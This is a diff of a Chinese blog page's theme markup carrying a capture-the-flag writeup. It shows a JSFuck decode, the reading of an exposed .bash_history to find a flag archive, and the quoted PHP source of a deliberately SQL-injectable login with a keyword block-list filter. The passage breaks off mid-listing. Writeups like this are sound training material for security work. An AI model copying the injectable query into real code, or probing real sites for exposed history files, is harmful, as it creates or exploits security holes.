@@ -1,21 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-
-    <!--[if lt IE 9]>
-        <style>body {display: none; background: none !important} </style>
-        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
-    <![endif]-->
-
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="format-detection" content="telephone=no" />
-<meta name="author" content="LaLa" />
-
-
-
-<meta name="description" content="——ZJGSCTF——-——持续更新中——-">
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="——ZJGSCTF——-——持续更新中——-">
 <meta name="keywords" content="writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ZJGSCTF-writeup">
@@ -46,325 +37,166 @@
 <meta name="twitter:title" content="ZJGSCTF-writeup">
 <meta name="twitter:description" content="——ZJGSCTF——-——持续更新中——-">
 <meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdknuoc8j30ld08haaa.jpg">
-
-<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
-
-
-    <link rel="alternate" href="/atom.xml" title="啦啦菌NODE" type="application/atom+xml">
-
-
-
-    <link rel="shortcut icon" href="/favicon.png">
-
-
-
-    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
-
-
-
-    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
-
-
-
-    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
-    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
-
-
-<link rel="stylesheet" href="/css/style.css">
-
-
-
-<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-
-
-<title>ZJGSCTF-writeup | 啦啦菌NODE</title>
-
-<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-
-<script>
-    var yiliaConfig = {
-        fancybox: true,
-        animate: true,
-        isHome: false,
-        isPost: true,
-        isArchive: false,
-        isTag: false,
-        isCategory: false,
-        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
-        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
-        search: true
-    }
-</script>
-
-
-    <script> yiliaConfig.jquery_ui = [false]; </script>
-
-
-
-    <script> yiliaConfig.rootUrl = "\/";</script>
-
-
-
-
-
-
-</head>
-<body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/">LaLa</a></h1>
-        </hgroup>
-
-        
-
-        
-            <form id="search-form">
-            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
-            <i class="fa fa-times" onclick="resetSearch()"></i>
-            </form>
-            <div id="local-search-result"></div>
-            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
-        
-
-
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                    
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
-                </div>
-            </div>
-        
-
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a href="/">主页</a></li>
-                        
-                            <li><a href="/archives/">所有文章</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day漏洞/">0day漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DAPP/">DAPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NEO/">NEO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/solidity/">solidity</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/">比特币</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/血泪教训/">血泪教训</a></li></ul>
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://stella9527.github.io/">9527</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://blog.betamao.me/">betamao_now</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://betamaois.github.io">betamao</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://err0rzz.github.io">壮壮</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://qianfei11.github.io/">feifan</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://esebanana.github.io">ESE</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://hhddj.github.io/">hhd</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0kami</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://b3t4m3ee.github.io/">b3t4m3ee</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">leavesong</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://iamstudy.cnblogs.com/">l3m0n</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://myblackmanba.github.io/">MyBlackManba</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
-                    
-                    </div>
-                </section>
-                
-
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">biubiubiubiu～&lt;br&gt;动感光波！&lt;br&gt;&lt;br&gt;晚安～</div>
-                </section>
-                
-            </div>
-        </div>
-    </header>                
-</div>
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LaLa</a></h1>
-      </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">LaLa</a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a href="/">主页</a></li>
-                
-                    <li><a href="/archives/">所有文章</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" target="_blank" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" target="_blank" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-            </nav>
-        </header>                
-    </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
-</nav>
-      <div class="body-wrap"><article id="post-ZJGSCTF_writeup" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/09/18/ZJGSCTF_writeup/" class="article-date">
-      <time datetime="2017-09-18T00:17:13.000Z" itemprop="datePublished">2017-09-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
         
-  
-    <h1 class="article-title" itemprop="name">
-      ZJGSCTF-writeup
-    </h1>
-  
-
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-
-        
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
-    </div>
-
-        <div class="clearfix"></div>
-      </div>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
           
-        <p>——<a href="http://121.42.189.18" target="_blank" rel="external">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
-<h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">戳这里=w=</a></p>
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ZJGSCTF-writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/09/24/WEB-CTF中的sql盲注/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/08/29/WEB-CTF中的SQL注入/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&text=ZJGSCTF-writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&is_video=false&description=ZJGSCTF-writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJGSCTF-writeup&body=Check out this article: http://lalajun.com/2017/09/18/ZJGSCTF_writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&name=ZJGSCTF-writeup&description=&lt;p&gt;——&lt;a href=&#34;http://121.42.189.18&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ZJGSCTF&lt;/a&gt;——-&lt;br&gt;——持续更新中——-&lt;br&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-综合题"><span class="toc-number">1.</span> <span class="toc-text">[9-7]综合题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：编码及Linux"><span class="toc-number">1.1.</span> <span class="toc-text">涉及范围：编码及Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-31-水能载舟亦可赛艇"><span class="toc-number">2.</span> <span class="toc-text">[8-31]水能载舟亦可赛艇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围-php源码，sql注入"><span class="toc-number">2.1.</span> <span class="toc-text">涉及范围:php源码，sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-有点意思吧"><span class="toc-number">3.</span> <span class="toc-text">[9.18]有点意思吧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：php源码，hash长度扩展攻击"><span class="toc-number">3.1.</span> <span class="toc-text">涉及范围：php源码，hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有点意思吧2"><span class="toc-number">4.</span> <span class="toc-text">有点意思吧2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><span class="toc-number">4.1.</span> <span class="toc-text">涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-看起来有点难啊"><span class="toc-number">5.</span> <span class="toc-text">[9.1]看起来有点难啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：sql盲注"><span class="toc-number">5.1.</span> <span class="toc-text">涉及范围：sql盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家邮电平台"><span class="toc-number">6.</span> <span class="toc-text">皇家邮电平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><span class="toc-number">6.1.</span> <span class="toc-text">涉及范围：源码泄露，本地文件包含，sql注入，后门利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">7.</span> <span class="toc-text">babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git信息泄露-hackgit-php字符串拼接注入"><span class="toc-number">7.1.</span> <span class="toc-text">.git信息泄露 hackgit php字符串拼接注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#俄罗斯方块"><span class="toc-number">8.</span> <span class="toc-text">俄罗斯方块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js代码-jsFuck"><span class="toc-number">8.1.</span> <span class="toc-text">js代码 jsFuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#全球某工商CTF-安全系的博客"><span class="toc-number">9.</span> <span class="toc-text">全球某工商CTF-安全系的博客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><span class="toc-number">9.1.</span> <span class="toc-text">后台 伪验证 sql注入 登录 模板注入攻击 菜刀</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ZJGSCTF-writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">啦啦菌NODE</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-09-18T00:17:13.000Z" itemprop="datePublished">2017-09-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>——<a href="http://121.42.189.18" target="_blank" rel="noopener">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
+<h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">戳这里=w=</a></p>
 <h3 id="涉及范围：编码及Linux"><a href="#涉及范围：编码及Linux" class="headerlink" title="涉及范围：编码及Linux"></a>涉及范围：编码及Linux</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdknuoc8j30ld08haaa.jpg" alt="9-7.1"></p>
-<p>页面乱码，猜测是一种编码方式，由 [ ] ! + ( ) { } 组成<br>参考 <a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">编码与加密</a><br>得出是jsfuck编码，百度 <a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">在线解码</a><br>解码得出：1bc29b36f623ba82aaf6724fd3b16718.php<br>原地址去掉index.php，加上1bc29b36f623ba82aaf6724fd3b16718.php，访问</p>
+<p>页面乱码，猜测是一种编码方式，由 [ ] ! + ( ) { } 组成<br>参考 <a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="noopener">编码与加密</a><br>得出是jsfuck编码，百度 <a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="noopener">在线解码</a><br>解码得出：1bc29b36f623ba82aaf6724fd3b16718.php<br>原地址去掉index.php，加上1bc29b36f623ba82aaf6724fd3b16718.php，访问</p>
 <p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjrdl9bvqvj30pr0453yf.jpg" alt="9-7.2"></p>
 <p>脑袋,猜测地址1bc29b36f623ba82aaf6724fd3b16718.php的前部分32位为MD5编码<br>对其试解码得：MD5<br>考虑原地址b0b0ad119f425408fc3d45253137d33d为MD5解码，解码失败。<br>再进行了访问MD5.php等方法，无果，有点无从下手。<br>退档重新思考，再看提示，发现掉坑里，tip在我脑袋里应该是指包的头部，burpsuite抓包发现<strong>tip</strong></p>
 <p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fjrdljievpj30dd03fwei.jpg" alt="9.7.3"></p>
-<p>百度 <a href="http://blog.csdn.net/chinalinuxzend/article/details/1849419" target="_blank" rel="external">history of bash</a><br>于是访问 <strong>./.bash_history</strong></p>
+<p>百度 <a href="http://blog.csdn.net/chinalinuxzend/article/details/1849419" target="_blank" rel="noopener">history of bash</a><br>于是访问 <strong>./.bash_history</strong></p>
 <p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjrdlsuefkj30640110fx.jpg" alt="9-7.4"></p>
 <p>有过一次压缩文件命令，访问 <strong>./flagbak.zip</strong><br>下载解压，得到flag</p>
-<h2 id="8-31-水能载舟亦可赛艇"><a href="#8-31-水能载舟亦可赛艇" class="headerlink" title="[8-31]水能载舟亦可赛艇"></a>[8-31]水能载舟亦可赛艇</h2><p><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="external">戳这里=w=</a></p>
+<h2 id="8-31-水能载舟亦可赛艇"><a href="#8-31-水能载舟亦可赛艇" class="headerlink" title="[8-31]水能载舟亦可赛艇"></a>[8-31]水能载舟亦可赛艇</h2><p><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">戳这里=w=</a></p>
 <h3 id="涉及范围-php源码，sql注入"><a href="#涉及范围-php源码，sql注入" class="headerlink" title="涉及范围:php源码，sql注入"></a>涉及范围:php源码，sql注入</h3><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fjreabq0woj307m03e3ya.jpg" alt="1"></p>
 <p>看到页面,好像典型的sql注入，但是web日常先看源码</p>
 <p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fjreau9f4pj30800100l8.jpg" alt="2"></p>
-<p>好像有点提示，尝试去url访问source.txt,得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    die;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</div><div class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </div><div class="line">        <span class="built_in">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</div><div class="line">        <span class="built_in">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </div><div class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</div><div class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</div><div class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</div><div class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </div><div class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="built_in">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close(<span class="variable">$con</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>好像有点提示，尝试去url访问source.txt,得到源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 